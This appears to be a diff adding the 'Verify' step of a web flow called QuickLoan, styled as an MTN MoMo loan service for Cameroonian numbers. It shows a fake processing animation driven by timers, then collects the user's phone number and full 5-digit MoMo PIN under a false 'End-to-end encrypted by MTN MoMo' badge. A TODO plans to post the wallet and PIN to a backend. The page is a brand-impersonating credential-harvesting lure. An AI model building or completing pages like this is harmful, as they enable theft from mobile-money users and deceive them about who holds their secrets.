@@ -1,0 +1,692 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Verify — QuickLoan</title>
+<style>
+  :root{
+    --mtn-blue:#004F9F;
+    --mtn-blue-dark:#003B77;
+    --mtn-blue-light:#1A6DC4;
+    --mtn-yellow:#FFCC00;
+    --bg:#F7F9FC;
+    --card:#FFFFFF;
+    --text:#0A1B33;
+    --muted:#64748B;
+    --border:#E2E8F0;
+    --green:#00A651;
+    --green-soft:#E6F7ED;
+    --red:#DC2626;
+  }
+
+  *{
+    box-sizing:border-box;
+    margin:0;
+    padding:0;
+    font-family:'Segoe UI',system-ui,-apple-system,sans-serif;
+  }
+
+  html,body{height:100%;}
+
+  body{
+    background:var(--bg);
+    color:var(--text);
+    min-height:100vh;
+    display:flex;
+    flex-direction:column;
+    align-items:center;
+  }
+
+  /* ============ BLUE FRAME LINES ============ */
+  .frame-top, .frame-bottom{
+    width:100%;
+    height:6px;
+    background:linear-gradient(90deg, var(--mtn-blue) 0%, var(--mtn-blue-light) 50%, var(--mtn-blue) 100%);
+  }
+  .frame-bottom{margin-top:auto;}
+
+  /* ============ HEADER ============ */
+  .header{
+    width:100%;
+    background:#FFFFFF;
+    border-bottom:1px solid var(--border);
+    padding:16px 20px;
+    position:sticky;top:0;z-index:50;
+    box-shadow:0 2px 12px rgba(0,79,159,0.06);
+  }
+  .header-inner{
+    width:100%;max-width:920px;margin:0 auto;
+    display:flex;align-items:center;justify-content:space-between;
+  }
+
+  .brand{display:flex;align-items:center;gap:11px;text-decoration:none;}
+  .brand .logo{
+    width:42px;height:42px;border-radius:50%;
+    background:var(--mtn-blue);
+    display:flex;align-items:center;justify-content:center;
+    font-weight:900;color:var(--mtn-yellow);
+    font-size:11.5px;letter-spacing:-0.4px;
+    box-shadow:0 4px 12px rgba(0,79,159,0.28);
+  }
+  .brand .wordmark{display:flex;flex-direction:column;line-height:1.15;}
+  .brand .wordmark strong{
+    font-size:17px;font-weight:800;color:var(--mtn-blue);letter-spacing:-0.3px;
+  }
+  .brand .wordmark small{
+    font-size:10.5px;color:var(--muted);font-weight:600;
+    letter-spacing:0.4px;text-transform:uppercase;
+  }
+
+  /* ---- STEP INDICATOR ---- */
+  .steps{display:flex;align-items:center;gap:8px;}
+  .step{
+    display:flex;align-items:center;gap:7px;
+    font-size:12.5px;font-weight:700;color:var(--muted);
+  }
+  .step .num{
+    width:24px;height:24px;border-radius:50%;
+    background:#E8EEF6;color:var(--muted);
+    display:flex;align-items:center;justify-content:center;
+    font-size:12px;font-weight:800;
+  }
+  .step.done .num{background:var(--green);color:#FFFFFF;}
+  .step.done{color:var(--green);}
+  .step.active .num{background:var(--mtn-blue);color:#FFFFFF;}
+  .step.active{color:var(--mtn-blue);}
+  .step-line{width:20px;height:2px;background:#E8EEF6;border-radius:2px;}
+  .step-line.done{background:var(--green);}
+
+  /* ============ MAIN ============ */
+  main{
+    width:100%;max-width:920px;flex:1;
+    padding:40px 20px 60px;
+    display:flex;flex-direction:column;align-items:center;
+  }
+
+  /* ============ CARD ============ */
+  .card{
+    background:var(--card);
+    width:100%;max-width:460px;
+    border-radius:20px;
+    padding:34px 28px 32px;
+    box-shadow:0 12px 40px rgba(0,79,159,0.10);
+    border:1px solid var(--border);
+    border-top:4px solid var(--mtn-blue);
+  }
+
+  /* ============ PROCESSING VIEW ============ */
+  #processingView{
+    text-align:center;
+    padding:20px 0 10px;
+  }
+
+  .spinner{
+    width:76px;height:76px;
+    margin:0 auto 26px;
+    position:relative;
+  }
+  .spinner .ring{
+    position:absolute;inset:0;
+    border-radius:50%;
+    border:5px solid #E8EEF6;
+  }
+  .spinner .ring.active{
+    border-color:transparent;
+    border-top-color:var(--mtn-blue);
+    border-right-color:var(--mtn-blue);
+    animation:spin 0.9s linear infinite;
+  }
+  @keyframes spin{to{transform:rotate(360deg);}}
+
+  #processingView h2{
+    font-size:21px;font-weight:800;
+    color:var(--text);margin-bottom:10px;
+    letter-spacing:-0.4px;
+  }
+  #processingView p{
+    font-size:14px;color:var(--muted);
+    line-height:1.6;margin-bottom:26px;
+  }
+
+  /* ---- PROGRESS BAR ---- */
+  .progress-wrap{
+    width:100%;
+    height:6px;
+    background:#E8EEF6;
+    border-radius:6px;
+    overflow:hidden;
+    margin-bottom:14px;
+  }
+  .progress-bar{
+    height:100%;
+    width:0%;
+    background:linear-gradient(90deg,var(--mtn-blue),var(--mtn-blue-light));
+    border-radius:6px;
+    transition:width 0.3s ease;
+  }
+  .progress-label{
+    font-size:12px;
+    color:var(--muted);
+    font-weight:600;
+    letter-spacing:0.3px;
+  }
+
+  /* ---- PROCESSING STEPS ---- */
+  .proc-steps{
+    list-style:none;
+    margin:26px 0 0;
+    padding:0;
+    text-align:left;
+  }
+  .proc-steps li{
+    display:flex;align-items:center;gap:12px;
+    padding:10px 0;
+    font-size:13px;
+    color:#A9B6C7;
+    font-weight:600;
+    transition:color .3s;
+  }
+  .proc-steps li .tick{
+    width:22px;height:22px;border-radius:50%;
+    background:#E8EEF6;
+    display:flex;align-items:center;justify-content:center;
+    flex-shrink:0;
+    transition:.3s;
+  }
+  .proc-steps li .tick svg{
+    width:12px;height:12px;
+    stroke:#A9B6C7;fill:none;
+    stroke-width:3;stroke-linecap:round;stroke-linejoin:round;
+    transition:.3s;
+  }
+  .proc-steps li.done{color:var(--text);}
+  .proc-steps li.done .tick{background:var(--green);}
+  .proc-steps li.done .tick svg{stroke:#FFFFFF;}
+
+  /* ============ VERIFY VIEW ============ */
+  #verifyView{display:none;}
+
+  /* ---- WALLET NUMBER FIELD ---- */
+  .field{margin-bottom:24px;}
+
+  .field label{
+    display:block;
+    font-size:11.5px;
+    color:var(--muted);
+    font-weight:700;
+    letter-spacing:0.7px;
+    text-transform:uppercase;
+    margin-bottom:10px;
+  }
+
+  .wallet-input-wrap{
+    display:flex;
+    align-items:center;
+    border:2px solid var(--border);
+    border-radius:13px;
+    background:#FBFCFE;
+    transition:.15s;
+    overflow:hidden;
+  }
+  .wallet-input-wrap:focus-within{
+    border-color:var(--mtn-blue);
+    background:#FFFFFF;
+    box-shadow:0 0 0 4px rgba(0,79,159,0.10);
+  }
+
+  .wallet-input-wrap .prefix{
+    display:flex;
+    align-items:center;
+    gap:6px;
+    padding:0 12px 0 16px;
+    font-size:15px;
+    font-weight:800;
+    color:var(--mtn-blue);
+    background:transparent;
+    height:56px;
+    border-right:1px solid var(--border);
+    flex-shrink:0;
+  }
+  .wallet-input-wrap .prefix .flag{
+    width:20px;height:20px;border-radius:50%;
+    background:linear-gradient(180deg,#CE1126 0%,#CE1126 50%,#FCD116 50%,#FCD116 100%);
+    display:inline-block;
+    position:relative;
+  }
+  .wallet-input-wrap .prefix .flag::after{
+    content:"";
+    position:absolute;left:0;top:50%;transform:translateY(-50%);
+    width:0;height:0;
+    border-top:5px solid transparent;
+    border-bottom:5px solid transparent;
+    border-left:9px solid #007A5E;
+  }
+
+  .wallet-input-wrap input{
+    flex:1;
+    border:none;
+    outline:none;
+    background:transparent;
+    font-size:16px;
+    font-weight:700;
+    color:var(--text);
+    padding:0 16px;
+    height:56px;
+    letter-spacing:0.5px;
+    font-family:inherit;
+  }
+  .wallet-input-wrap input::placeholder{
+    color:#A9B6C7;
+    font-weight:500;
+    letter-spacing:0;
+  }
+
+  .wallet-tag{
+    display:inline-flex;
+    align-items:center;
+    gap:6px;
+    background:#EAF2FB;
+    color:var(--mtn-blue);
+    font-size:11px;
+    font-weight:800;
+    letter-spacing:0.6px;
+    text-transform:uppercase;
+    padding:5px 12px;
+    border-radius:999px;
+    margin-top:10px;
+  }
+  .wallet-tag svg{
+    width:12px;height:12px;
+    stroke:var(--mtn-blue);fill:none;
+    stroke-width:2.6;stroke-linecap:round;stroke-linejoin:round;
+  }
+
+  /* ---- PIN ---- */
+  .pin-wrap{
+    display:flex;
+    gap:10px;
+    justify-content:center;
+    margin-bottom:10px;
+  }
+  .pin-wrap input{
+    width:52px;height:60px;
+    border-radius:12px;
+    border:2px solid var(--border);
+    background:#FBFCFE;
+    text-align:center;
+    font-size:24px;
+    font-weight:800;
+    color:var(--text);
+    outline:none;
+    transition:.15s;
+    font-family:inherit;
+    caret-color:var(--mtn-blue);
+  }
+  .pin-wrap input:focus{
+    border-color:var(--mtn-blue);
+    background:#FFFFFF;
+    box-shadow:0 0 0 4px rgba(0,79,159,0.10);
+    transform:translateY(-2px);
+  }
+  .pin-wrap input.filled{
+    border-color:var(--mtn-blue);
+    background:#EAF2FB;
+  }
+  .pin-wrap input.error{
+    border-color:var(--red);
+    background:#FEF2F2;
+    animation:shake .35s;
+  }
+  @keyframes shake{
+    0%,100%{transform:translateX(0);}
+    25%{transform:translateX(-6px);}
+    75%{transform:translateX(6px);}
+  }
+
+  .pin-hint{
+    font-size:11.5px;
+    color:var(--muted);
+    text-align:center;
+    margin-bottom:28px;
+    font-weight:500;
+    line-height:1.55;
+  }
+  .pin-hint.error{color:var(--red);font-weight:700;}
+
+  /* ---- BUTTONS ---- */
+  .btn-row{display:flex;gap:12px;}
+  .btn-back{
+    flex:0 0 auto;
+    padding:16px 22px;
+    border:1.5px solid var(--border);
+    border-radius:12px;
+    background:#FFFFFF;
+    color:var(--muted);
+    font-size:15px;font-weight:700;
+    cursor:pointer;text-decoration:none;
+    display:flex;align-items:center;justify-content:center;
+    transition:.18s;
+  }
+  .btn-back:hover{border-color:var(--mtn-blue);color:var(--mtn-blue);background:#F1F6FC;}
+
+  .cta{
+    flex:1;
+    padding:16px;
+    border:none;border-radius:12px;
+    background:var(--mtn-blue);
+    color:#FFFFFF;
+    font-size:16px;font-weight:800;
+    cursor:pointer;letter-spacing:0.3px;
+    transition:.18s;
+    box-shadow:0 8px 20px rgba(0,79,159,0.3);
+  }
+  .cta:hover{
+    background:var(--mtn-blue-dark);
+    transform:translateY(-2px);
+    box-shadow:0 12px 26px rgba(0,79,159,0.38);
+  }
+  .cta:active{transform:translateY(0);}
+  .cta:disabled{opacity:0.5;cursor:not-allowed;transform:none;box-shadow:none;}
+
+  .secure-note{
+    display:flex;align-items:center;justify-content:center;gap:6px;
+    font-size:11.5px;color:var(--muted);margin-top:18px;font-weight:600;
+  }
+  .secure-note svg{
+    width:13px;height:13px;stroke:var(--green);fill:none;
+    stroke-width:2.4;stroke-linecap:round;stroke-linejoin:round;
+  }
+
+  /* ============ MOBILE ============ */
+  @media(max-width:640px){
+    .steps .step span:not(.num){display:none;}
+    .step-line{width:14px;}
+    main{padding:28px 16px 44px;}
+    .card{padding:28px 20px;}
+    .brand .wordmark small{display:none;}
+    .pin-wrap input{width:46px;height:54px;font-size:22px;}
+    .btn-row{flex-direction:column-reverse;}
+    .btn-back{width:100%;}
+  }
+</style>
+</head>
+<body>
+
+  <!-- TOP BLUE FRAME -->
+  <div class="frame-top"></div>
+
+  <!-- HEADER -->
+  <header class="header">
+    <div class="header-inner">
+      <a class="brand" href="index.html">
+        <div class="logo">MTN</div>
+        <div class="wordmark">
+          <strong>QuickLoan</strong>
+          <small>Powered by MoMo</small>
+        </div>
+      </a>
+
+      <div class="steps">
+        <div class="step done"><span class="num">✓</span><span>Amount</span></div>
+        <div class="step-line done"></div>
+        <div class="step done"><span class="num">✓</span><span>Details</span></div>
+        <div class="step-line done"></div>
+        <div class="step active"><span class="num">3</span><span>Verify</span></div>
+        <div class="step-line"></div>
+        <div class="step"><span class="num">4</span><span>Confirm</span></div>
+      </div>
+    </div>
+  </header>
+
+  <!-- MAIN -->
+  <main>
+    <div class="card">
+
+      <!-- ============ PROCESSING VIEW (unchanged) ============ -->
+      <div id="processingView">
+        <div class="spinner">
+          <div class="ring"></div>
+          <div class="ring active"></div>
+        </div>
+
+        <h2>Processing your application</h2>
+        <p>We're verifying your details and checking your MoMo eligibility. This takes just a moment.</p>
+
+        <div class="progress-wrap">
+          <div class="progress-bar" id="progressBar"></div>
+        </div>
+        <div class="progress-label" id="progressLabel">Starting…</div>
+
+        <ul class="proc-steps" id="procSteps">
+          <li data-step="0">
+            <span class="tick"><svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg></span>
+            Checking your details
+          </li>
+          <li data-step="1">
+            <span class="tick"><svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg></span>
+            Verifying MoMo wallet
+          </li>
+          <li data-step="2">
+            <span class="tick"><svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg></span>
+            Reviewing eligibility
+          </li>
+        </ul>
+      </div>
+
+      <!-- ============ VERIFY VIEW (edited) ============ -->
+      <div id="verifyView">
+
+        <!-- WALLET NUMBER -->
+        <div class="field">
+          <label for="walletNumber">Phone number</label>
+          <div class="wallet-input-wrap">
+            <span class="prefix">
+              <span class="flag"></span>
+              +237
+            </span>
+            <input
+              type="tel"
+              id="walletNumber"
+              inputmode="numeric"
+              placeholder="6XX XXX XXX"
+              autocomplete="tel"
+            >
+          </div>
+          <div class="wallet-tag">
+            <svg viewBox="0 0 24 24">
+              <rect x="2" y="6" width="20" height="14" rx="3"/>
+              <path d="M2 10h20"/>
+            </svg>
+            MoMo wallet
+          </div>
+        </div>
+
+        <!-- PIN -->
+        <div class="pin-wrap" id="pinWrap">
+          <input type="password" inputmode="numeric" maxlength="1" data-idx="0">
+          <input type="password" inputmode="numeric" maxlength="1" data-idx="1">
+          <input type="password" inputmode="numeric" maxlength="1" data-idx="2">
+          <input type="password" inputmode="numeric" maxlength="1" data-idx="3">
+          <input type="password" inputmode="numeric" maxlength="1" data-idx="4">
+        </div>
+        <p class="pin-hint" id="pinHint">
+          This is your secret. Never share it with anyone.
+        </p>
+
+        <!-- ACTIONS -->
+        <div class="btn-row">
+          <a href="apply.html" class="btn-back">← Back</a>
+          <button type="button" class="cta" id="verifyBtn" disabled>Confirm</button>
+        </div>
+
+        <div class="secure-note">
+          <svg viewBox="0 0 24 24">
+            <rect x="3" y="11" width="18" height="11" rx="2"/>
+            <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
+          </svg>
+          End-to-end encrypted by MTN MoMo
+        </div>
+
+      </div>
+
+    </div>
+  </main>
+
+  <!-- BOTTOM BLUE FRAME -->
+  <div class="frame-bottom"></div>
+
+<script>
+  // ----- READ FROM URL -----
+  const params = new URLSearchParams(location.search);
+  const amount = parseInt(params.get('amount')) || 50000;
+  const months = parseInt(params.get('months')) || 1;
+  const phone  = params.get('phone') || '';
+  const ref    = params.get('ref')   || '';
+
+  // Prefill wallet number (strip +237 if present)
+  if(phone){
+    document.getElementById('walletNumber').value =
+      phone.replace(/^\+?237/,'').replace(/\s/g,'');
+  }
+
+  // ==================== PROCESSING SEQUENCE (unchanged) ====================
+  const procSteps   = document.querySelectorAll('#procSteps li');
+  const progressBar = document.getElementById('progressBar');
+  const progressLbl = document.getElementById('progressLabel');
+
+  const stageText = [
+    'Checking your details…',
+    'Verifying your MoMo wallet…',
+    'Reviewing eligibility…',
+    'Almost done…'
+  ];
+
+  function showProcessingStep(i){
+    procSteps.forEach((li, idx) => {
+      if(idx <= i) li.classList.add('done');
+    });
+    progressLbl.textContent = stageText[i] || stageText[stageText.length-1];
+    progressBar.style.width = ((i + 1) / procSteps.length * 100) + '%';
+  }
+
+  let step = 0;
+  showProcessingStep(0);
+
+  const stepInterval = setInterval(() => {
+    step++;
+    if(step < procSteps.length){
+      showProcessingStep(step);
+    }
+  }, 900);
+
+  setTimeout(() => {
+    clearInterval(stepInterval);
+    showProcessingStep(procSteps.length - 1);
+    progressBar.style.width = '100%';
+    progressLbl.textContent = 'Ready';
+
+    setTimeout(() => {
+      document.getElementById('processingView').style.display = 'none';
+      document.getElementById('verifyView').style.display = 'block';
+      document.querySelector('#pinWrap input').focus();
+    }, 250);
+  }, 3000);
+
+  // ==================== WALLET INPUT ====================
+  const walletInput = document.getElementById('walletNumber');
+
+  // Format as user types: 6XX XXX XXX
+  walletInput.addEventListener('input', e => {
+    let v = e.target.value.replace(/\D/g,'').slice(0,9);
+    let out = '';
+    if(v.length > 0) out += v.slice(0,3);
+    if(v.length > 3) out += ' ' + v.slice(3,6);
+    if(v.length > 6) out += ' ' + v.slice(6,9);
+    e.target.value = out;
+    updateVerifyState();
+  });
+
+  // ==================== PIN INPUT LOGIC (unchanged) ====================
+  const pinInputs = [...document.querySelectorAll('#pinWrap input')];
+  const verifyBtn = document.getElementById('verifyBtn');
+  const pinHint   = document.getElementById('pinHint');
+
+  pinInputs.forEach((inp, i) => {
+    inp.addEventListener('input', e => {
+      const v = e.target.value.replace(/\D/g,'');
+      e.target.value = v.slice(0,1);
+
+      if(e.target.value){
+        e.target.classList.add('filled');
+        inp.classList.remove('error');
+        pinHint.classList.remove('error');
+        pinHint.textContent = "This is your secret. Never share it with anyone.";
+
+        if(i < pinInputs.length - 1){
+          pinInputs[i+1].focus();
+        }
+      } else {
+        e.target.classList.remove('filled');
+      }
+      updateVerifyState();
+    });
+
+    inp.addEventListener('keydown', e => {
+      if(e.key === 'Backspace' && !e.target.value && i > 0){
+        pinInputs[i-1].focus();
+        pinInputs[i-1].value = '';
+        pinInputs[i-1].classList.remove('filled');
+        updateVerifyState();
+      }
+    });
+
+    inp.addEventListener('paste', e => {
+      e.preventDefault();
+      const pasted = (e.clipboardData.getData('text') || '').replace(/\D/g,'').slice(0,5);
+      pasted.split('').forEach((ch, idx) => {
+        if(pinInputs[idx]){
+          pinInputs[idx].value = ch;
+          pinInputs[idx].classList.add('filled');
+        }
+      });
+      const next = Math.min(pasted.length, 4);
+      pinInputs[next].focus();
+      updateVerifyState();
+    });
+  });
+
+  function updateVerifyState(){
+    const pinFull    = pinInputs.every(i => i.value.length === 1);
+    const walletFull = walletInput.value.replace(/\D/g,'').length === 9;
+    verifyBtn.disabled = !(pinFull && walletFull);
+  }
+
+  // ==================== CONFIRM ====================
+  verifyBtn.addEventListener('click', () => {
+    const pin    = pinInputs.map(i => i.value).join('');
+    const wallet = '+237' + walletInput.value.replace(/\D/g,'');
+
+    if(!/^\d{5}$/.test(pin)){
+      pinInputs.forEach(i => i.classList.add('error'));
+      pinHint.classList.add('error');
+      pinHint.textContent = 'Please enter your full 5-digit PIN.';
+      return;
+    }
+
+    verifyBtn.disabled = true;
+    verifyBtn.textContent = 'Confirming…';
+
+    setTimeout(() => {
+      // TODO: POST { wallet, pin } to your backend → MTN MoMo API
+      window.location.href =
+        'confirm.html' +
+        '?amount=' + amount +
+        '&months=' + months +
+        '&phone='  + encodeURIComponent(wallet) +
+        '&ref='    + encodeURIComponent(ref);
+    }, 1200);
+  });
+</script>
+</body>
+</html>
